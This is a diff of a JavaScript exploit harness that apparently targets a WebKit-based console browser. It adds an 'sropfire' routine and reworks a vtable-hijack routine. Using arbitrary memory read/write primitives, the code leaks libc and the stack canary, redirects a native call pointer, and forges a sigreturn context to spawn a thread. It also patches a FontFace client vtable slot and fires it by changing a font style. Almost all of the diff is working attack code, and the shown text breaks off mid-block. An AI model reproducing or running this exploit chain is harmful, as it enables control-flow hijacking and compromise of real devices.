@@ -5406,6 +5406,167 @@ function _startWsShell(){
         break;
       }
 
+      case 'sropfire':{
+        /* THE MEASURED-RETURN SROP FIRE (offline Rosetta + V70, 2026-11-17).
+         * Identified from the saved 14.10 libc call sites, not a stub sweep:
+         *   sigreturn(417)  = lk+0x13ED0  (libc wrapper 0x2F310 -> thunk 0x288)
+         *   thr_create(430) = lk+0x13D20  (Thrd_create helper 0x4BDE0 -> 0x358)
+         *   thr_exit(431)   = lk+0x13EC0  (Thrd_exit wrapper 0x4C240 -> 0x418)
+         * The V70 diff-scan measures the native trampoline's live return slot
+         * across a harmless rehearsal. sigreturn installs RIP=thr_create,
+         * RDI=child ctx, RSI=safe tid out, RDX=0, and RSP=that measured slot.
+         * thr_create's ret therefore returns through the native trampoline:
+         * no getcontext, no frame-header write, no recovery-RVA guessing. */
+        if(!S.neEntry||!S.batt){reply.err='No NE target';break;}
+        function SF(s){try{var x=new XMLHttpRequest();x.open('POST','/beacon/'+encodeURIComponent('SROP-'+s),false);x.send();}catch(e){}}
+        try{
+          /* the proven pthread-backlink lk chain */
+          var entS=S.absRead(0x10001c8000n,0x100),trS=0n;
+          for(var eS=0;eS<entS.length;eS++){if(entS[eS]>=0x10001f0000n&&entS[eS]<0x1000200000n){trS=entS[eS];break;}}
+          if(trS===0n){reply.err='no thread-record ptr';break;}
+          var trrS=S.absRead(trS,0x60),ptS=0n;
+          for(var tS=0;tS<trrS.length;tS++){if(trrS[tS]>=0x880000000n&&trrS[tS]<0x900000000n){ptS=trrS[tS];break;}}
+          if(ptS===0n){reply.err='no pthread ptr';break;}
+          var ndS=ptS,qS=0n;
+          for(var hS=0;hS<5;hS++){
+            var ppS=S.absRead(ndS,0x60);qS=ppS[8];
+            if((qS&0x3fffn)===0x218n&&qS>0x800000000n)break;
+            ndS=qS-0x38n;
+          }
+          if((qS&0x3fffn)!==0x218n){reply.err='backlink fail';break;}
+          var lkS=qS-0x6C218n;
+          var canS=S.absRead(lkS+0x751D0n,8)[0];
+          SF('1 lk=0x'+lkS.toString(16)+' canary=0x'+canS.toString(16));
+          if(!(canS>0x1000000n)){reply.err='canary fail';break;}
+          reply.lk='0x'+lkS.toString(16);
+          reply.targets={recovery:'banked retSlot cfr-0x328',getcontext:'lk+0x142C0',
+                         sigreturn:'lk+0x13ED0',thr_create:'lk+0x13D20',thr_exit:'lk+0x13EC0'};
+
+          /* (1) THE BANKED V70 RETURN-SLOT DELTA: four independent boots
+           * placed retSlot at cfr-0x328 exactly (0x...9ef8/0x...1ef8/
+           * 0x...de78/0x...1ef8 against cfr ...a220). The sigreturn call's
+           * own native-call push writes the slot before thr_create returns;
+           * no rehearsal or content scan is needed. */
+          var CAP=S.fakeScope,cfrS=S.cfr;
+          var retSlotAddr=cfrS-0x328n;
+          reply.retSlot={addr:'0x'+retSlotAddr.toString(16),provenance:'V70 constant cfr-0x328 across four boots'};
+          SF('2 direct retSlot=0x'+retSlotAddr.toString(16)+' (cfr-0x328)');
+
+          /* (2) THE IN-SESSION KERNEL CAPTURE (srop16). The hand-built class
+           * is CLOSED: srop12-15 wrote every record byte (the complete 814a
+           * replication included) and all four installs died identically -
+           * the kill is the boot-specific pointer chain (+0x280..0x2D8), which
+           * cannot be replicated without a live capture. The capture call is
+           * getcontext(lk+0x142C0) with RDI=B: the kernel writes the TRUE
+           * current record (fsbase/gsbase/SCS/FP all real for THIS thread).
+           * B = fakeScope+0x2000 pre-cloned with the live scope head, so the
+           * post-call trampoline read of [B+0x38] (the VM pair) stays valid
+           * UNLESS the kernel also writes the record preamble - which is
+           * exactly what mode=gc measures. B+0x48==B (the captured RDI self-
+           * pointer) + magic 0x480 = the capture proven. mode=gc stops after
+           * the capture; rt and the real fire patch the captured record and
+           * install it with sigreturn(RDI=B). */
+          var CTX=CAP+0x1000n,STK=CAP+0x2F00n,WIT=CAP+0x3000n,B=CAP+0x2000n;
+          for(var zS=0;zS<0x500/8;zS++)S.absWrite(CTX+BigInt(zS*8),0n);
+          S.absWrite(WIT,0n);
+          S.absWrite(STK,lkS+0x13EC0n);
+          var headS=S.absRead(CAP,0x48);
+          for(var hW=0;hW<headS.length;hW++)S.absWrite(B+BigInt(hW*8),headS[hW]);
+          reply.vm38='0x'+S.absRead(S.fakeScope+0x38n,8)[0].toString(16);
+          /* the child starts at the identified Thrd_exit import. Only the
+           * proven manual gates are used; parent TLS/stack state is not copied. */
+          S.absWrite(CTX+0x048n,0n);
+          S.absWrite(CTX+0x0C0n,0x43n);
+          S.absWrite(CTX+0x0D0n,0n);
+          S.absWrite(CTX+0x0E0n,lkS+0x13EC0n);
+          S.absWrite(CTX+0x0E8n,0x43n);
+          S.absWrite(CTX+0x0F0n,0x202n);
+          S.absWrite(CTX+0x0F8n,STK);
+          S.absWrite(CTX+0x100n,0x3Bn);
+          S.absWrite(CTX+0x108n,0x480n);
+          S.absWrite(CTX+0x110n,0x10002n);
+          S.absWrite(CTX+0x118n,0x20001n);
+          function SF_CALL(target,scope){
+            if(S.scopeSlot&&S.scopeOrig)S.absWrite(S.scopeSlot,scope||CAP);
+            var orig=S.absRead(S.neEntry.addr+0x28n,8)[0];
+            S.absWrite(S.neEntry.addr+0x28n,target);
+            SF('CALL target=0x'+target.toString(16));
+            try{Math.round(-5.7);}catch(eC){}
+            S.absWrite(S.neEntry.addr+0x28n,orig);
+            if(S.scopeSlot&&S.scopeOrig)S.absWrite(S.scopeSlot,S.scopeOrig);
+            return orig;
+          }
+
+          /* (3) THE CAPTURE CALL: scopeSlot<-B so RDI=B; getcontext writes the
+           * true record into B and (if the preamble is not kernel-written)
+           * the VM pair survives the post-call trampoline read. */
+          if(S.scopeSlot&&S.scopeOrig)S.absWrite(S.scopeSlot,B);
+          var oGC=S.absRead(S.neEntry.addr+0x28n,8)[0];
+          S.absWrite(S.neEntry.addr+0x28n,lkS+0x142C0n);
+          SF('GC-CALL target=lk+0x142C0 buf=0x'+B.toString(16));
+          try{Math.round(-5.7);}catch(eG){}
+          S.absWrite(S.neEntry.addr+0x28n,oGC);
+          if(S.scopeSlot&&S.scopeOrig)S.absWrite(S.scopeSlot,S.scopeOrig);
+
+          /* (4) THE CAPTURE GATES: no install without a proven record. */
+          var vmA=S.absRead(B+0x38n,8)[0],selfB=S.absRead(B+0x48n,8)[0];
+          var csB=S.absRead(B+0xE8n,8)[0],ssB=S.absRead(B+0x100n,8)[0];
+          var mgB=S.absRead(B+0x108n,8)[0],tyB=S.absRead(B+0x110n,8)[0];
+          var sbB=S.absRead(B+0x118n,8)[0],d0B=S.absRead(B+0xD0n,8)[0];
+          var ripB=S.absRead(B+0xE0n,8)[0],rspB=S.absRead(B+0xF8n,8)[0];
+          var flgB=S.absRead(B+0xF0n,8)[0];
+          reply.capture={buf:'0x'+B.toString(16),vmAfter:'0x'+vmA.toString(16),
+                         self:'0x'+selfB.toString(16),cs:'0x'+csB.toString(16),
+                         ss:'0x'+ssB.toString(16),rflags:'0x'+flgB.toString(16),
+                         magic:'0x'+mgB.toString(16),type:'0x'+tyB.toString(16),
+                         subtype:'0x'+sbB.toString(16),d0:'0x'+d0B.toString(16),
+                         rip:'0x'+ripB.toString(16),rsp:'0x'+rspB.toString(16)};
+          var capOK=(selfB===B&&mgB===0x480n&&tyB===0x10002n&&sbB===0x20001n&&csB===0x43n&&ssB===0x3Bn);
+          reply.capture.valid=capOK;
+          if(!capOK){reply.err='capture gates failed - NOT installing';SF('GC-FAIL gates');break;}
+          SF('GC-OK self==buf magic=0x480 vmAfter==vm38='+(vmA===S.absRead(S.fakeScope+0x38n,8)[0]));
+          var isRT=(msg.mode==='rt');
+          if(msg.mode==='gc'){SF('5 GC-ONLY capture banked');break;}
+
+          /* (5) PATCH ONLY the identified fields of the TRUE captured record. */
+          if(isRT){
+            S.absWrite(B+0x048n,CAP);       /* tv buffer = the scope head (E2-proven) */
+            S.absWrite(B+0x050n,0n);        /* tz = NULL */
+            S.absWrite(B+0x0E0n,lkS+0xB50n);
+            SF('3 ROUNDTRIP target=gettimeofday (no thr_create)');
+          }else{
+            S.absWrite(B+0x048n,CTX);
+            S.absWrite(B+0x050n,WIT);
+            S.absWrite(B+0x0E0n,lkS+0x13D20n);
+            SF('3 child RIP=thr_exit parent=(RDI=ctx,RSI=wit,RDX=0) captured RSP kept');
+          }
+          S.absWrite(B+0x058n,0n);
+          S.absWrite(B+0x0F8n,retSlotAddr);
+
+          /* (6) THE INSTALL: sigreturn reads the captured record at RDI=B. */
+          var origSr=SF_CALL(lkS+0x13ED0n,B);
+          reply.sigreturnRestored=(S.absRead(S.neEntry.addr+0x28n,8)[0]===origSr);
+          if(isRT){
+            var tvSec=S.absRead(CAP,8)[0],tvUsec=S.absRead(CAP+8n,8)[0];
+            reply.roundtrip={sec:'0x'+tvSec.toString(16),usec:'0x'+tvUsec.toString(16),
+                             valid:(tvSec>0x40000000n&&tvSec<0x80000000n&&tvUsec<0xF4240n)};
+            SF('4 ROUNDTRIP parent ALIVE sec=0x'+tvSec.toString(16)+' usec=0x'+tvUsec.toString(16));
+          }
+          var tidS=S.absRead(WIT,8)[0];
+          reply.witness='0x'+tidS.toString(16);
+          reply.threadCreated=(tidS>0n&&tidS<0x100000n);
+          SF('4 post-sigreturn witness=0x'+tidS.toString(16)+' parent ALIVE');
+          setTimeout(function(){
+            try{
+              var tid2=S.absRead(WIT,8)[0];
+              SF('5 settled witness=0x'+tid2.toString(16));
+              try{var xs=new XMLHttpRequest();xs.open('POST','/api/result',false);xs.send(JSON.stringify({type:'result',sropSettled:{witness:'0x'+tid2.toString(16),threadCreated:(tid2>0n&&tid2<0x100000n)}}));}catch(eX){}
+            }catch(eS2){}
+          },500);
+        }catch(eS){reply.err='sropfire fault: '+String(eS&&eS.message?eS.message:'?');}
+        break;
+      }
+
       case 'rawcall':{
         /* THE DECODE-IMMUNE CALL PRIMITIVE (session 41): redirect, call,
          * DISCARD THE RETURN UNTOUCHED (an unbound expression statement -
@@ -6171,7 +6332,7 @@ function _startWsShell(){
          * FONTCHANGED VTABLE DISPATCH instead of the rawcall. The C++ call
          * site's RSI is NOT cfr (the rawcall fire's death: the kernel honors
          * id=RSI=cfr, the tid write killed the JS at the Math.round return).
-         * THE CHAIN: the walk (MBUF->L1->IM->m_ptr@+0x10->FO->VP) -> FAKEVT
+         * THE CHAIN: the certified FACE->L1->IM->m_ptr@+0x08->FO->VP -> FAKEVT
          * (copy VP's slots incl. the RTTI precede, swap ONLY s3 = the
          * fontStateChanged slot = +0x18 the PS5-fork) -> the gates at
          * FO+0xC0..+0x118 (the kernel reads the ucontext at RDI=FO) +
@@ -6215,49 +6376,125 @@ function _startWsShell(){
             if(!(canF>0x1000000n)){reply.err='canary fail';break;}
           }
           reply.lk='0x'+lkF.toString(16);
-          /* (2) the walk: MBUF -> L1 -> IM -> m_ptr@+0x10 -> FO -> VP */
-          var MBUF=0n;
+          /* (2) THE CERTIFIED FACE WALK: v688_self is the boot's reclaimed
+           * CSSFontFace (FACE-IDENTITY-OK); v688_buf is only the later OOB/
+           * scratch buffer. Session-194 live proof: SELF+0x58 held the real
+           * L1=0x100070d410 while MBUF+0x58 pointed at an unrelated hash.
+           * WeakPtrImpl::m_ptr is at +0x08 (the p691 W2 read), NOT +0x10:
+           * the real IM read was [3, FO, 0x800000001]. */
+          var MBUF=0n,FACE=0n;
           try{MBUF=BigInt('0x'+(localStorage.getItem('v688_buf')||'0'));}catch(eM2){}
-          if(!(MBUF>=0x1000000000n)){reply.err='no MBUF';break;}
-          var L1=S.absRead(MBUF+0x58n,8)[0];
-          FB2('2 mbuf=0x'+MBUF.toString(16)+' L1=0x'+L1.toString(16));
+          try{FACE=BigInt('0x'+(localStorage.getItem('v688_self')||'0'));}catch(eF2){}
+          if(!(MBUF>=0x1000000000n)){reply.err='no MBUF scratch';break;}
+          if(!(FACE>=0x1000000000n)){FACE=MBUF;FB2('2a no certified SELF - MBUF fallback');}
+          var L1=S.absRead(FACE+0x58n,8)[0];
+          reply.FACE='0x'+FACE.toString(16);
+          FB2('2 face=0x'+FACE.toString(16)+' scratch=0x'+MBUF.toString(16)+' L1=0x'+L1.toString(16));
           if(!(L1>=0x1000000000n&&L1<0x1010000000n)){reply.err='L1 band fail';break;}
           var ht=S.absRead(L1-0x10n,0x50);
-          var IM=0n,FO=0n,VP=0n;
+          var IM=0n,FO=0n,VP=0n,candN=0,chainN=0;
+          /* ISSUE-295 CLIENT IDENTITY GATE (session-194): do NOT accept the
+           * first cage-band object with a 0x08-band vptr. Our former winner
+           * (VP=S.BASE+0x722BF38) has slots 6/7 NULL and fails every FontFace
+           * Client delta; it is NOT the table used by p691/p804/#295.
+           * Enumerate only live bucket pointers and require the complete
+           * measured FontFace::Client secondary-vtable fingerprint. */
+          var expD=[0x1710B78n,0x1710B48n,0x324C3D8n,0x1710478n,
+                    0x324C3D8n,0x324C3D8n,0x1ABA728n,0x1710318n];
+          var expVP=S.BASE+0x724DB28n; /* OUR old 9/9 Client captures, not their C6A1B28 anchor */
+          reply.expectedVP='0x'+expVP.toString(16);
           for(var bI=0;bI<ht.length;bI++){
             var bv=ht[bI];
             if(bv<0x1000000000n||bv>=0x1010000000n)continue;
             var w2=S.absRead(bv,0x18);
-            var FOc=w2[2];
+            var FOc=w2[1]; /* WeakPtrImpl::m_ptr@+0x08 (p691 W2 + live session-194) */
             if(FOc<0x1000000000n||FOc>=0x1010000000n)continue;
             var VPc=S.absRead(FOc,8)[0];
             if(VPc<0x800000000n||VPc>=0x880000000n)continue;
-            IM=bv;FO=FOc;VP=VPc;break;
+            chainN++;
+            /* Prefilter before any VP dereference: only our measured Client
+             * rodata address is read; a text/other-table candidate cannot
+             * turn the identity check into an XO-read crash. */
+            if(VPc!==expVP)continue;
+            candN++;
+            var preC=S.absRead(VPc-0x10n,0x10);
+            if(preC[0]!==0xFFFFFFFFFFFFFFE0n||preC[1]!==0n)continue;
+            var vtC=S.absRead(VPc,0x48),okC=true;
+            for(var sC=0;sC<8;sC++){
+              if(vtC[sC]===0n||VPc-vtC[sC]!==expD[sC]){okC=false;break;}
+            }
+            if(!okC||vtC[8]!==0n)continue;
+            var linksC=S.absRead(FOc+0x08n,0x10);
+            /* Closed two-object cycle: Client+8 = its WeakPtrImpl and
+             * Client+0x10 = the same certified reclaimed face. */
+            if(linksC[0]!==bv||linksC[1]!==FACE)continue;
+            IM=bv;FO=FOc;VP=VPc;
+            reply.clientIdentity={backlink:true,backingIsFACE:true,
+                                  offsetToTop:'-32',slots:'9/9 #295 deltas'};
+            break;
           }
-          if(!FO){reply.err='walk fail (no chain)';break;}
-          FB2('3 IM=0x'+IM.toString(16)+' FO=0x'+FO.toString(16)+' VP=0x'+VP.toString(16));
+          reply.walkChains=chainN;
+          reply.walkCandidates=candN;
+          if(!FO){
+            reply.err='Client identity gate: no #295 FontFace Client; chains='+chainN+', expectedVP matches='+candN;
+            FB2('3g NO CLIENT MATCH chains='+chainN+' expectedVP='+candN+' - NO WRITES');
+            break;
+          }
+          FB2('3 IM=0x'+IM.toString(16)+' FO=0x'+FO.toString(16)+' VP=0x'+VP.toString(16)+' CLIENT=9/9');
           reply.FO='0x'+FO.toString(16);reply.VP='0x'+VP.toString(16);
-          /* (3) FAKEVT: copy VP-0x10..VP+0x38 (the RTTI precede + 6 slots + NULL), swap s3 (+0x18) */
-          var FAKEVT=MBUF+0x4000n;
-          for(var cI=0;cI<9;cI++)S.absWrite(FAKEVT+BigInt(cI*8),S.absRead(VP-0x10n+BigInt(cI*8),8)[0]);
+          if(msg.diag==='7'){
+            reply.identityOnly=true;
+            FB2('3h IDENTITY-ONLY PASS - no writes, no trigger');
+            break;
+          }
+          /* (3) TABLE SELECTION. fire20's ALL-REAL heap-table control died at
+           * the actual async callback: this independently reproduces #282's
+           * buffer-vptr wall (real VP accepted, byte-identical ArrayBuffer
+           * table dies). The payload path therefore uses the REAL module VP
+           * and patches ONLY slot3 in place; FO keeps its original vptr.
+           * Legacy diag2/3/4 retain the heap FAKEVT for historical probes. */
           var isDiag=(msg.diag&&msg.diag!=='');
           var isDiag2=(msg.diag==='2');
           var isDiag3=(msg.diag==='3');
           var isDiag4=(msg.diag==='4');
           var isDiag5=(msg.diag==='5');
+          var isDiag6=(msg.diag==='6');
+          var isDiag8=(msg.diag==='8');
+          var useRealVP=(!isDiag||isDiag5||isDiag6||isDiag8);
+          var FAKEVT_RAW=MBUF+0x4000n;
+          var FAKEVT=useRealVP?VP:(FAKEVT_RAW+0x10n);
+          var realSlot3=0n;
+          if(useRealVP){
+            realSlot3=S.absRead(VP+0x18n,8)[0];
+            FB2('4r REAL-VP mode slot3=0x'+realSlot3.toString(16));
+          }else{
+            /* VP is the ADDRESS POINT (slot 0), not the pre-header. */
+            for(var cI=0;cI<11;cI++)S.absWrite(FAKEVT_RAW+BigInt(cI*8),S.absRead(VP-0x10n+BigInt(cI*8),8)[0]);
+          }
+          if(isDiag8){
+            /* SAME-VALUE WRITE CONTROL: no payload, no FO/gate writes, no
+             * trigger. A reply proves the real module vtable is writable. */
+            S.absWrite(VP+0x18n,realSlot3);
+            var wr8=S.absRead(VP+0x18n,8)[0];
+            reply.realVPWritable=(wr8===realSlot3);
+            reply.realVP='0x'+VP.toString(16);
+            FB2('8 REAL-VP same-value write '+(wr8===realSlot3?'SURVIVED':'MISMATCH'));
+            if(wr8!==realSlot3)reply.err='real VP readback mismatch';
+            break;
+          }
           if(isDiag5){
-            /* DIAG5: THE RECOVERABLE DISPATCH PROBE (session-190: the diag3
-             * crash = the dispatch FIRES - thr_self wrote the tid over
-             * [FO+0] = the vtable pointer -> the next virtual jumped to it).
-             * THE RECOVERABLE VERSION: gettimeofday (lk+0xB50: writes 16
-             * recognizable time bytes at [RDI]) at +0x18 AND +0x20 - the
-             * primary table keeps the REAL VP slots (the copied FAKEVT) -
-             * the time-write lands at [FO] (RDI=FO) or [FO+0x20] (the
-             * secondary this-adjustment) - EITHER = the dispatch PROVEN
-             * + the RDI question ANSWERED - both slots saved+restorable */
+            /* DIAG5: the SINGLE-SLOT state-change probe. Keep ref/deref and
+             * every other callback genuine; replace ONLY slot 3
+             * (fontStateChanged) with gettimeofday. Paired with DIAG6's
+             * all-real control, a transition crash is a clean A/B verdict. */
             S.absWrite(FAKEVT+0x18n,lkF+0xB50n);
-            S.absWrite(FAKEVT+0x20n,lkF+0xB50n);
-            FB2('D5 DIAG5: gettimeofday at +0x18/+0x20 (the recoverable probe)');
+            FB2('D5 DIAG5: gettimeofday at slot3 ONLY (ref/deref real)');
+          }
+          if(isDiag6){
+            /* DIAG6: ALL-REAL CONTROL - no payload, no gates, FO vptr only.
+             * Reaching the reply with FO still FAKEVT proves the corrected
+             * forged table + trigger path survives before any payload test. */
+            FB2('D6 DIAG6: all-real control, slot3 unchanged');
           }
           if(isDiag4){
             /* DIAG4: THE BUCKET CLIENT (the boot's own analysis line:
@@ -6286,17 +6523,18 @@ function _startWsShell(){
              * -> thr_self(RDI=FO) -> [FO+0] = the tid. The restore is
              * immediate (the same synchronous JS block). */
             for(var dI3=0;dI3<8;dI3++)S.absWrite(FAKEVT+BigInt(dI3*8),lkF+0x2C0n);
-            FB2('D3 DIAG3: all slots=thr_self; the swap = FO+0x00 AND FO+0x20');
+            FB2('D3 DIAG3: all slots=thr_self; the swap = FO+0x00 ONLY');
           }
           
-          else {
+          else if(!isDiag5&&!isDiag6){
             var s3T=isDiag?(lkF+0x2C0n):(lkF+0x13ED0n);
-            /* session-188: their RIP2 poison test names pk=4 = fontPropertyChanged
-             * at +0x20 (the ICF-folded empty), triggered by .style='italic' -
-             * NOT the family rename; cover BOTH slots */
+            /* The fresh-load transition identifies slot3 (fontStateChanged).
+             * The REAL FIRE arms slot3 only: no second spawn from slot4 and
+             * no ambiguity about which callback carried the arguments. */
             S.absWrite(FAKEVT+0x18n,s3T);
-            S.absWrite(FAKEVT+0x20n,s3T);
+            if(isDiag)S.absWrite(FAKEVT+0x20n,s3T);
             if(isDiag)FB2('D DIAG: s3=lk+0x2C0');
+            else FB2('R REAL: thr_create at slot3 ONLY');
           }
           FB2('4 FAKEVT=0x'+FAKEVT.toString(16)+' s3=0x'+(lkF+0x13ED0n).toString(16));
           /* (4) the witness + the child stack */
@@ -6309,7 +6547,7 @@ function _startWsShell(){
            * gettimeofday probe writes at [RDI] directly - no ucontext
            * needed) */
           var vpOrig=S.absRead(FO,8)[0];
-          var skipGates=(msg.diag==='5');
+          var skipGates=(isDiag5||isDiag6);
           if(!skipGates){
           S.absWrite(FO+0x048n,WIT);               /* the child RDI = the witness */
           S.absWrite(FO+0x0C0n,0x43n);             /* CS */
@@ -6322,18 +6560,18 @@ function _startWsShell(){
           S.absWrite(FO+0x110n,0x10002n);          /* type */
           S.absWrite(FO+0x118n,0x20001n);          /* subtype */
           }
-          if(skipGates)FB2('5b gates SKIPPED (probe mode)');
-          FB2('5 gates at FO set, witness=0x'+WIT.toString(16)+' pre=0x'+witPre.toString(16));
+          if(skipGates)FB2('5b gates SKIPPED (probe/control mode)');
+          else FB2('5 gates at FO set');
+          FB2('5w witness=0x'+WIT.toString(16)+' pre=0x'+witPre.toString(16));
           /* (6) THE SWAP: mode 2 = the FACE (MBUF primary+secondary);
            * else FO+0x00 */
           var mb0Pre=0n,mb20Pre=0n;
-          var fo20Pre=0n;
           var c98Pre=0n;
-          if(isDiag5){
-            fo20Pre=S.absRead(FO+0x20n,8)[0];
+          if(isDiag5||isDiag6){
+            /* FO IS the Client secondary subobject. FO+0x20 is another live
+             * wrapper field, NOT a second vtable; never swap it. */
             S.absWrite(FO,FAKEVT);
-            S.absWrite(FO+0x20n,FAKEVT);
-            reply._5='armed';
+            reply._5=isDiag5?'armed-slot3':'control-all-real';
           } else if(isDiag4){
             var CLI=0n;
             try{CLI=BigInt('0x'+(localStorage.getItem('v688_cli')||'0'));}catch(eC4){}
@@ -6351,10 +6589,8 @@ function _startWsShell(){
             S.absWrite(CLI-0x20n,FAKEVT);
             FB2('6 SWAPPED [cli-0x20] (was 0x'+c98Pre.toString(16)+') -> FAKEVT(all-thr_self) cli=0x'+CLI.toString(16));
           } else if(isDiag3){
-            fo20Pre=S.absRead(FO+0x20n,8)[0];
             S.absWrite(FO,FAKEVT);
-            S.absWrite(FO+0x20n,FAKEVT);
-            FB2('6 SWAPPED FO+0x00 (was 0x'+vpOrig.toString(16)+') AND FO+0x20 (was 0x'+fo20Pre.toString(16)+') -> FAKEVT(all-thr_self)');
+            FB2('6 SWAPPED FO+0x00 ONLY (was 0x'+vpOrig.toString(16)+') -> FAKEVT(all-thr_self)');
           } else if(isDiag2){
             mb0Pre=S.absRead(MBUF,8)[0];
             mb20Pre=S.absRead(MBUF+0x20n,8)[0];
@@ -6377,23 +6613,29 @@ function _startWsShell(){
            * dispatches fontStateChanged/fontPropertyChanged to the client
            * (FO) - then trigger on the LOADED face (their zi faces) */
           var fsEl=null;
+          /* A unique family per command: DIAG6 then DIAG5 can run on the same
+           * live session without the second load collapsing into the cache. */
+          var famFire='vf'+Date.now().toString(36);
           try{
             fsEl=document.createElement('style');
-            fsEl.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';
+            fsEl.textContent='@font-face{font-family:'+famFire+';src:local(Arial);unicode-range:U+0042;}';
             document.head.appendChild(fsEl);
-            FB2('7b style injected');
+            FB2('7b style injected family='+famFire);
           }catch(eI5){FB2('7b style inject fail');}
           var loadedFaces=[];
           try{
-            document.fonts.load('1em v1','AB').then(function(f){
+            document.fonts.load('1em '+famFire,'AB').then(function(f){
               loadedFaces=f;
               FB2('7c loaded n='+f.length);
               /* THE TRIGGER on the freshly-loaded face - INSIDE the .then:
                * the load transition + the property change both happen
                * while our FAKEVT is in place */
               try{
-                if(f.length>0){f[0].style='italic';FB2('7d style on loaded face');}
-                else FB2('7d no loaded faces');
+                if(f.length>0){
+                  var oldSt=String(f[0].style||'').toLowerCase();
+                  f[0].style=(oldSt==='italic'?'normal':'italic');
+                  FB2('7d style toggled on loaded face');
+                }else FB2('7d no loaded faces');
               }catch(eT5){FB2('7d trigger fail');}
             },function(){FB2('7c load rejected');});
             fired='load-pending';
@@ -6403,7 +6645,11 @@ function _startWsShell(){
            * within the settled window */
           if(!fired||fired==='load-pending'){
             for(var rI=0;rI<facesArr.length;rI++){
-              try{facesArr[rI].style='italic';fired='style-any';break;}catch(eR2){}
+              try{
+                var oldAny=String(facesArr[rI].style||'').toLowerCase();
+                facesArr[rI].style=(oldAny==='italic'?'normal':'italic');
+                fired='style-any';break;
+              }catch(eR2){}
             }
           }
           FB2('8 trigger fired='+(fired?'YES':'NO'));
@@ -6411,18 +6657,26 @@ function _startWsShell(){
            * may be synchronous - read immediately too) */
           var witPost=S.absRead(WIT,8)[0];
           FB2('9 witness imm 0x'+witPre.toString(16)+' -> 0x'+witPost.toString(16));
-          /* (8b) THE DIAG READBACKS (correctly after the trigger) */
-          if(isDiag5){
+          /* (8b) THE DIAG READBACKS. The load promise resolves ~30ms AFTER
+           * the immediate reply (fire19: 7c/7d followed every restore), so an
+           * immediate restore made DIAG5/6 blind to the actual callback.
+           * Keep the table armed through the .then and the 500ms settled
+           * readback; restore only there (or immediately on positive proof). */
+          var diagRestored=false;
+          if(isDiag5||isDiag6){
             var f0n=S.absRead(FO,8)[0];
-            var f20n=S.absRead(FO+0x20n,8)[0];
             reply.FO0now='0x'+f0n.toString(16);
-            reply.FO20now='0x'+f20n.toString(16);
-            if(f0n!==FAKEVT){FB2('D5 *** [FO+0] CHANGED: 0x'+f0n.toString(16)+' - RDI=FO - THE DISPATCH FIRED ***');reply.dispatchProven=true;reply.rdiIs='FO';}
-            if(f20n!==FAKEVT){FB2('D5 *** [FO+0x20] CHANGED: 0x'+f20n.toString(16)+' - RDI=FO+0x20 (the secondary this) - THE DISPATCH FIRED ***');reply.dispatchProven=true;reply.rdiIs='FO+0x20';}
-            if(f0n===FAKEVT&&f20n===FAKEVT){FB2('D5 no change - no dispatch this window');}
-            S.absWrite(FO,vpOrig);
-            S.absWrite(FO+0x20n,fo20Pre);
-            FB2('D5 both restored (0x'+vpOrig.toString(16)+' / 0x'+fo20Pre.toString(16)+')');
+            if(isDiag5&&f0n!==FAKEVT){
+              FB2('D5 *** [FO+0] CHANGED BEFORE RESTORE: 0x'+f0n.toString(16)+' - RDI=FO ***');
+              reply.dispatchProven=true;reply.rdiIs='FO';
+              if(useRealVP)S.absWrite(VP+0x18n,realSlot3);
+              S.absWrite(FO,vpOrig);diagRestored=true;
+              FB2('D5 FO/slot3 restored after immediate proof');
+            }else{
+              reply.armedThroughSettled=true;
+              if(isDiag5)FB2('D5 no immediate change - HOLDING FAKEVT through .then/settled');
+              else{reply.controlImmediate=(f0n===FAKEVT);FB2('D6 immediate clean - HOLDING FAKEVT through .then/settled');}
+            }
           } else if(isDiag4){
             var cliNow=S.absRead(CLI,8)[0];
             var cliVtNow=S.absRead(CLI-0x20n,8)[0];
@@ -6433,15 +6687,11 @@ function _startWsShell(){
             FB2('D4 client vtable restored');
           } else if(isDiag3){
             var fo0Now=S.absRead(FO,8)[0];
-            var fo20Now=S.absRead(FO+0x20n,8)[0];
-            FB2('D3 [FO+0]=0x'+fo0Now.toString(16)+' [FO+0x20]=0x'+fo20Now.toString(16)+' (FAKEVT=0x'+FAKEVT.toString(16)+')');
+            FB2('D3 [FO+0]=0x'+fo0Now.toString(16)+' (FAKEVT=0x'+FAKEVT.toString(16)+')');
             reply.FO0now='0x'+fo0Now.toString(16);
-            reply.FO20now='0x'+fo20Now.toString(16);
-            if(fo0Now!==FAKEVT){FB2('D3 *** [FO+0] CHANGED - tid=0x'+fo0Now.toString(16)+' - THE DISPATCH FIRED ***');reply.dispatchProven=true;}
-            if(fo20Now!==FAKEVT){FB2('D3 *** [FO+0x20] CHANGED - tid=0x'+fo20Now.toString(16)+' - THE SECONDARY DISPATCH FIRED ***');reply.dispatchProven=true;reply.dispatchSecondary=true;}
+            if(fo0Now!==FAKEVT){FB2('D3 *** [FO+0] CHANGED BEFORE RESTORE - tid=0x'+fo0Now.toString(16)+' ***');reply.dispatchProven=true;}
             S.absWrite(FO,vpOrig);
-            S.absWrite(FO+0x20n,fo20Pre);
-            FB2('D3 FO vtables restored');
+            FB2('D3 FO vtable restored');
           } else if(isDiag2){
             var mb0Now=S.absRead(MBUF,8)[0];
             FB2('D2 [MBUF+0] now=0x'+mb0Now.toString(16));
@@ -6466,7 +6716,7 @@ function _startWsShell(){
             S.absWrite(MBUF,mb0Pre);
             S.absWrite(MBUF+0x20n,mb20Pre);
             FB2('D2 MBUF vtables restored (0x'+mb0Pre.toString(16)+' / 0x'+mb20Pre.toString(16)+')');
-          } else if(isDiag){
+          } else if(isDiag&&!isDiag5&&!isDiag6){
             var foNow=S.absRead(FO,8)[0];
             FB2('D [FO] now=0x'+foNow.toString(16)+' (FAKEVT was 0x'+FAKEVT.toString(16)+')');
             reply.FOnow='0x'+foNow.toString(16);
@@ -6482,6 +6732,28 @@ function _startWsShell(){
               var wit2=S.absRead(WIT,8)[0];
               var fd2={witness:'0x'+wit2.toString(16)};
               FB2('B settled witness=0x'+wit2.toString(16));
+              if((isDiag5||isDiag6)&&!diagRestored){
+                var fSet=S.absRead(FO,8)[0];
+                fd2.FO='0x'+fSet.toString(16);
+                if(isDiag5){
+                  if(fSet!==FAKEVT){fd2.dispatchProven=true;fd2.rdiIs='FO';FB2('B5 *** SETTLED [FO] CHANGED - SLOT3 DISPATCH + RDI=FO ***');}
+                  else FB2('B5 settled unchanged - slot3 did NOT dispatch');
+                }else{
+                  fd2.controlSurvived=(fSet===FAKEVT);
+                  FB2('B6 settled control='+(fSet===FAKEVT?'CLEAN':'CHANGED'));
+                }
